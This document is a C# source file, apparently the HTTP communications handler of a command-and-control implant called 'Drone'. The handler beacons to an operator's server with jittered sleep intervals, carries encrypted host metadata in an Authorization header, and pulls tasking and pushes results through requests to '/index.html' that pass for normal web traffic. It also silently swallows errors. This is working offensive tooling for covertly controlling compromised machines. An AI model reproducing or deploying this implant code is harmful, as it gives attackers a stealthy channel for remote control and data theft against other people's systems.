using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Utilities;

namespace Drone.Handlers;

public class HttpHandler : Handler
{
    private readonly string _connectAddress;
    private readonly int _connectPort;

    private WebClient _client;

    private bool _running;
    
    public HttpHandler(string connectAddress, int connectPort)
    {
        _connectAddress = connectAddress;
        _connectPort = connectPort;
    }
    
    public override async Task Start()
    {
        _client = new WebClient();
        _client.BaseAddress = $"http://{_connectAddress}:{_connectPort}";
        _client.Headers.Clear();

        var enc = Crypto.EncryptObject(Metadata);
        var buf = enc.ToByteArray(); 

        _client.Headers.Add("Authorization", $"Bearer {Convert.ToBase64String(buf)}");
        
        _running = true;

        while (_running)
        {
            if (GetOutbound(out var outbound))
            {
                // send outbound messages in a POST
                await Post(outbound).ContinueWith(HandleResponse);
            }
            else
            {
                // otherwise, just do a GET
                await CheckIn().ContinueWith(HandleResponse);
            }
            
            var interval = Config.Get<int>("SleepInterval");
            var jitter = Config.Get<int>("SleepJitter");
            var sleep = CalculateSleepTime(interval, jitter);
            
            Thread.Sleep(sleep * 1000);
        }
    }
    
    private static int CalculateSleepTime(int interval, int jitter)
    {
        var diff = (int)Math.Round((double)interval / 100 * jitter);

        var min = interval - diff;
        var max = interval + diff;

        var rand = new Random();
        return rand.Next(min, max);
    }

    private async Task<byte[]> CheckIn()
    {
        return await _client.DownloadDataTaskAsync(Endpoint);
    }

    private async Task<byte[]> Post(C2Message outbound)
    {
        var raw = outbound.Serialize();
        return await _client.UploadDataTaskAsync(Endpoint, raw);
    }

    private void HandleResponse(Task<byte[]> data)
    {
        try
        {
            var response = data.Result;
        
            if (response is null || response.Length == 0)
                return;

            var message = response.Deserialize<C2Message>();
            QueueInbound(message);
        }
        catch
        {
            // swallow exceptions
        }
    }

    public override void Stop()
    {
        _running = false;
    }

    private static string Endpoint => "/index.html";
}